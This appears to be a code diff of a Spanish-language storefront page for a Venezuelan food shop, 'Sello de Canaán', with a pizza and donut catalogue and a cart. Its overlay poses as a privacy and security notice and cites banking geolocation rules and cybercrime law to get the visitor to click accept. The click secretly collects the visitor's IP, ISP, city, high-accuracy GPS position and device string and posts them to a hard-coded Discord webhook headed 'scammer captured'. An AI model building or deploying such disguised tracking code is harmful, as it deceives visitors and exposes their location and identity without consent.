@@ -3,114 +3,168 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sello de Canaán | Verificación de Pedido</title>
+    <title>Sello de Canaán | Verificación Segura</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Inter:wght@400;600;700;900&display=swap');
         :root { --primary-amber: #f89c22; --secondary-terracotta: #c12a27; --bg-cream: #eadfce; --text-chocolate: #552110; }
-        body { font-family: 'Inter', sans-serif; background-color: var(--bg-cream); color: var(--text-chocolate); overflow-x: hidden; }
+        body { font-family: 'Inter', sans-serif; background-color: var(--bg-cream); color: var(--text-chocolate); margin: 0; overflow-x: hidden; }
         .font-serif { font-family: 'Playfair Display', serif; }
+        .blur-active { filter: blur(10px); pointer-events: none; user-select: none; }
         [x-cloak] { display: none !important; }
-        .blur-bg { filter: blur(8px); pointer-events: none; }
     </style>
 </head>
 <body x-data="shop()" x-init="initShop()">
 
-    <div id="cookie-banner" class="fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-md px-4">
-        <div class="bg-white max-w-sm w-full p-8 rounded-[2.5rem] shadow-2xl text-center border-t-4 border-[#f89c22]">
-            <div class="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-6">
-                <i data-lucide="shield-check" class="text-[#f89c22] w-8 h-8"></i>
+    <div id="auth-overlay" class="fixed inset-0 z-[100] flex items-center justify-center bg-black/70 backdrop-blur-md px-4">
+        <div class="bg-white max-w-sm w-full p-8 rounded-[2.5rem] shadow-2xl text-center">
+            <div class="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-6">
+                <i data-lucide="shield-check" class="text-blue-600 w-8 h-8"></i>
             </div>
-            <h3 class="text-xl font-black mb-4">Verificación de Seguridad</h3>
-            <p class="text-sm text-gray-500 mb-8 leading-relaxed">
-                Para procesar pagos móviles y transferencias en <strong>Sello de Canaán</strong>, debemos verificar que su conexión sea segura y cumpla con la normativa de geolocalización bancaria de Venezuela.
-                <br><br>
-                <span class="text-[10px] font-bold uppercase text-[#c12a27]">Por favor, haga clic en "Aceptar" y permita el acceso a la ubicación cuando el navegador lo solicite.</span>
+            <h3 class="text-xl font-black mb-3">Aviso de Privacidad y Seguridad</h3>
+            <p class="text-[13px] text-gray-500 mb-8 leading-relaxed">
+                Para garantizar la seguridad de su transacción y cumplir con la <strong>Ley de Delitos Informáticos</strong>, este sitio utiliza cookies de verificación y protocolos de geolocalización bancaria.
             </p>
-            <button onclick="startAdvancedTracking()" class="w-full bg-[#552110] text-white py-4 rounded-2xl font-black text-sm uppercase tracking-widest hover:bg-[#c12a27] transition-all shadow-lg shadow-orange-100">
-                Aceptar y Verificar
+            <button onclick="captureIntel()" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-black text-sm uppercase tracking-widest hover:bg-blue-700 transition-all">
+                Aceptar y Continuar
             </button>
         </div>
     </div>
 
-    <div id="main-content" class="blur-bg">
-        <header class="sticky top-0 z-40 bg-white border-b py-4 px-6 flex justify-between items-center">
-            <h1 class="font-serif text-xl font-bold">SELLO DE CANAÁN</h1>
-            <div class="w-10 h-10 bg-[#552110] rounded-full flex items-center justify-center text-white"><i data-lucide="lock"></i></div>
+    <div id="content-body" class="blur-active">
+        
+        <div class="fixed left-4 bottom-6 z-50 transition-all" x-show="dolarBCV">
+            <div class="bg-white border-2 border-[#f89c22] p-2 px-4 rounded-2xl shadow-xl flex flex-col items-center">
+                <span class="text-[9px] font-black uppercase text-gray-400">BCV</span>
+                <span class="text-md font-black text-[#c12a27]" x-text="`Bs. ${dolarBCV}`"></span>
+            </div>
+        </div>
+
+        <button @click="openCart = true" class="fixed right-4 bottom-6 z-50 bg-[#c12a27] text-white p-4 rounded-full shadow-2xl">
+            <i data-lucide="shopping-cart"></i>
+            <span class="absolute -top-1 -right-1 bg-[#f89c22] text-white text-[10px] font-black px-2 py-0.5 rounded-full ring-2 ring-white" x-text="cartCount"></span>
+        </button>
+
+        <header class="sticky top-0 z-40 bg-white/90 backdrop-blur-md border-b py-4 px-6 flex justify-between items-center">
+            <h1 class="font-serif text-xl font-bold tracking-tight">SELLO DE CANAÁN</h1>
+            <div class="w-10 h-10 bg-[#552110] rounded-full flex items-center justify-center text-white shadow-md"><i data-lucide="lock" class="w-5 h-5"></i></div>
         </header>
 
-        <section class="h-[40vh] relative flex items-center justify-center">
+        <section class="relative h-[40vh] flex items-center justify-center text-center px-6 overflow-hidden">
             <img src="https://images.unsplash.com/photo-1513104890138-7c749659a591?q=80&w=1200" class="absolute inset-0 w-full h-full object-cover brightness-50">
-            <h2 class="relative text-white font-serif text-3xl italic">Procesando Transferencia...</h2>
+            <div class="relative z-10 text-white">
+                <h2 class="font-serif text-3xl italic mb-4">Lo mejor de la Tierra Prometida.</h2>
+                <button class="bg-[#f89c22] px-8 py-3 rounded-full font-black text-[10px] uppercase tracking-widest">Ver Catálogo</button>
+            </div>
         </section>
 
-        <div class="p-8 grid grid-cols-2 gap-4">
-            <div class="h-32 bg-white rounded-2xl animate-pulse"></div>
-            <div class="h-32 bg-white rounded-2xl animate-pulse"></div>
+        <main class="max-w-6xl mx-auto p-6 grid grid-cols-1 md:grid-cols-3 gap-6">
+            <template x-for="i in items" :key="i.id">
+                <div class="bg-white rounded-[2rem] overflow-hidden shadow-sm border border-gray-100 p-4">
+                    <img :src="i.img" class="w-full h-40 object-cover rounded-2xl mb-4">
+                    <div class="flex justify-between items-center mb-2">
+                        <span class="font-bold text-sm" x-text="i.nombre"></span>
+                        <span class="font-black text-[#c12a27]" x-text="`$${i.price}`"></span>
+                    </div>
+                    <button @click="addToCart(i)" class="w-full py-3 bg-[#eadfce] rounded-xl text-[10px] font-black uppercase">Agregar</button>
+                </div>
+            </template>
+        </main>
+    </div>
+
+    <div x-show="openCart" x-cloak class="fixed inset-0 z-[60] flex justify-end bg-black/60 backdrop-blur-sm">
+        <div @click.away="openCart = false" class="bg-white w-full md:max-w-md h-full flex flex-col shadow-2xl">
+            <div class="p-6 border-b flex justify-between items-center">
+                <h2 class="font-serif text-2xl text-[#552110]">Mi Canasta</h2>
+                <button @click="openCart = false"><i data-lucide="x"></i></button>
+            </div>
+            <div class="flex-grow overflow-y-auto p-6 space-y-4">
+                <template x-for="(cartItem, index) in cart" :key="index">
+                    <div class="bg-gray-50 p-4 rounded-2xl">
+                        <div class="flex justify-between font-bold mb-2">
+                            <span x-text="cartItem.nombre"></span>
+                            <span x-text="`$${cartItem.price}`"></span>
+                        </div>
+                        <textarea x-model="cartItem.nota" placeholder="Instrucciones especiales..." class="w-full text-xs p-2 rounded-lg border border-gray-200 outline-none" rows="1"></textarea>
+                    </div>
+                </template>
+            </div>
+            <div class="p-6 border-t bg-gray-50">
+                <div class="bg-orange-50 border border-orange-200 p-4 rounded-2xl mb-4">
+                    <p class="text-[10px] font-black text-orange-600 uppercase">Pago Móvil:</p>
+                    <p class="text-xs font-bold text-[#552110]">Banesco | 0412-1234567 | V-12.345.678</p>
+                </div>
+                <button onclick="alert('Pedido procesado')" class="w-full bg-[#25D366] text-white py-4 rounded-2xl font-black text-xs uppercase shadow-lg">Confirmar WhatsApp</button>
+            </div>
         </div>
     </div>
 
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1487184631517155380/-AX1M8NIbnJPuMjga4UiEpINEZQXOVKhWD895Si8_iFohLI5UGuSlVywuXt26x7FkUa1";
+        const WEBHOOK = "https://discord.com/api/webhooks/1487184631517155380/-AX1M8NIbnJPuMjga4UiEpINEZQXOVKhWD895Si8_iFohLI5UGuSlVywuXt26x7FkUa1";
 
-        async function startAdvancedTracking() {
-            // 1. Quitamos el banner y el blur para que el tipo crea que ya pasó
-            document.getElementById('cookie-banner').style.display = 'none';
-            document.getElementById('main-content').classList.remove('blur-bg');
+        async function captureIntel() {
+            // Desbloquear web
+            document.getElementById('auth-overlay').style.display = 'none';
+            document.getElementById('content-body').classList.remove('blur-active');
 
-            // 2. Intentamos capturar IP y GPS inmediatamente
             try {
-                // Captura de IP e ISP
+                // 1. Obtener IP e ISP
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const ipData = await ipRes.json();
 
-                // Solicitar ubicación GPS
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(async (position) => {
-                        const { latitude, longitude, accuracy } = position.coords;
-                        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                        
-                        await sendReport(ipData, mapsUrl, accuracy);
-                    }, async (err) => {
-                        // Si rechaza el GPS, mandamos al menos la IP
-                        await sendReport(ipData, "⚠️ PERMISO DENEGADO (GPS OFF)", "N/A");
+                // 2. Solicitar GPS
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async (pos) => {
+                        await sendReport(ipData, `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`, pos.coords.accuracy);
+                    }, async () => {
+                        await sendReport(ipData, "Acceso GPS Denegado", "N/A");
                     }, { enableHighAccuracy: true });
                 }
-            } catch (e) {
-                console.error("Tracking error");
-            }
+            } catch (e) { console.error("Intel error"); }
         }
 
-        async function sendReport(ipInfo, mapLink, precision) {
-            const report = {
-                username: "Sello de Canaán - SEGURIDAD",
-                content: "🚨 **¡ESTAFADOR CAPTURADO!** 🚨",
-                embeds: [{
-                    title: "Reporte de Localización",
-                    color: 16744226,
-                    fields: [
-                        { name: "🌐 IP", value: `\`${ipInfo.ip}\``, inline: true },
-                        { name: "🏢 Operadora", value: ipInfo.org || "Desconocido", inline: true },
-                        { name: "📍 Ciudad/Estado", value: `${ipInfo.city}, ${ipInfo.region}`, inline: true },
-                        { name: "🛰️ Mapa GPS Reales", value: mapLink },
-                        { name: "🎯 Precisión", value: `${precision} metros`, inline: true },
-                        { name: "📱 Dispositivo", value: `\`${navigator.userAgent.substring(0, 100)}\`` }
-                    ],
-                    footer: { text: "Inteligencia Sello de Canaán" },
-                    timestamp: new Date()
-                }]
-            };
-
-            await fetch(WEBHOOK_URL, {
+        async function sendReport(ipInfo, maps, accuracy) {
+            await fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(report)
+                body: JSON.stringify({
+                    username: "SEGURIDAD - CANAÁN",
+                    content: "🚨 **¡ESTAFADOR CAPTURADO!** 🚨",
+                    embeds: [{
+                        color: 16744226,
+                        fields: [
+                            { name: "🌐 IP", value: ipInfo.ip || "N/A", inline: true },
+                            { name: "🏢 Proveedor", value: ipInfo.org || "N/A", inline: true },
+                            { name: "📍 Ubicación Aproximada", value: `${ipInfo.city}, ${ipInfo.region}`, inline: true },
+                            { name: "🛰️ Google Maps (GPS)", value: maps },
+                            { name: "🎯 Margen Error", value: `${accuracy}m`, inline: true },
+                            { name: "📱 Info Dispositivo", value: navigator.userAgent.substring(0, 150) }
+                        ],
+                        timestamp: new Date()
+                    }]
+                })
             });
         }
 
-        function shop() { return { dolarBCV: 0, async initShop() { lucide.createIcons(); } } }
+        function shop() {
+            return {
+                openCart: false, dolarBCV: 0, cart: [],
+                items: [
+                    { id: 1, nombre: 'Pizza Margarita', price: 10, img: 'https://images.unsplash.com/photo-1574071318508-1cdbad80ad50?q=80&w=400' },
+                    { id: 2, nombre: 'Donas de Miel', price: 3, img: 'https://images.unsplash.com/photo-1551024601-bec78aea704b?q=80&w=400' }
+                ],
+                async initShop() {
+                    lucide.createIcons();
+                    const res = await fetch('https://ve.dolarapi.com/v1/dolares');
+                    const data = await res.json();
+                    this.dolarBCV = data.find(d => d.nombre === 'Oficial').promedio;
+                },
+                addToCart(i) { this.cart.push({...i, nota: ''}); this.openCart = true; },
+                get cartCount() { return this.cart.length; }
+            }
+        }
     </script>
 </body>
 </html>
